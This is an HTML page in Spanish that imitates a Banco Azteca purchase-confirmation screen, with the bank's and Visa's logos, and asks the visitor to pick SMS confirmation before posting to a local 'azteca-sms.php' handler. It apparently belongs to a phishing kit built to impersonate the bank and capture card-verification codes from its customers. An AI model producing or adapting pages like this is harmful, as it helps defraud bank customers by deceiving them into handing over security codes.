<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Azteca - Seguridad</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .container {
            max-width: 400px;
            margin-top: 50px;
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 10px;
        }
        .logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-height: 50px;
        }
        .form-check-label {
            margin-left: 10px;
        }
        .btn-primary {
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="img/azteca.png" alt="Banco Azteca">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" style="max-height: 30px;">
        </div>
        <h4>Manten tu cuenta segura</h4>
        <p>Casi terminamos.<br>Para proteger tu compra, Banco Azteca te pedirá confirmarla. Selecciona cómo quieres hacerlo:</p>
        <form action="azteca-sms.php" method="POST">
            <div class="form-check">
                <input class="form-check-input" type="radio" name="confirmation" id="sms" value="sms" checked>
                <label class="form-check-label" for="sms">
                    SMS ******
                </label>
            </div>
       
        <button type="submit" class="btn btn-primary mt-4">ENVIAR</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
